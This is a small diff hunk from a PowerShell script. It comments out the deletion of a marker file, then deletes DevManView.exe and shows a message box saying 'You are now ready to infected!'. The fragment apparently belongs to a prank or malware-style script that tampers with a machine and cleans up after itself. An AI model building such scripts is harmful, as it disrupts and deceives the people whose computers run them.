@@ -2136,7 +2136,7 @@ foreach ($knackered in $notepad) {
 }
 
 if (Test-Path "kummerspeck") {
-  Remove-Item "kummerspeck"
+#  Remove-Item "kummerspeck"
   Remove-Item "DevManView.exe"
   [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
   [System.Windows.Forms.MessageBox]::Show("You are now ready to infected!")
